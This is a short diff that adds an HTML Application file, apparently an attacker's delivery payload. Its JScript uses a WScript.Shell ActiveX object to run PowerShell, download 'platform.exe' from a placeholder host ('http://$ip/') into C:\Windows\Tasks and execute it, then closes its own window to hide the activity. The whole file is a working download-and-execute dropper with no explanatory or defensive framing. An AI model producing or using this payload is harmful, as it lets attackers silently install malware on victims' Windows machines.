@@ -1,0 +1,13 @@
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("powershell iwr -uri 'http://$ip/platform.exe' -outfile C:\\Windows\\Tasks\\platform.exe;C:\\Windows\\Tasks\\platform.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
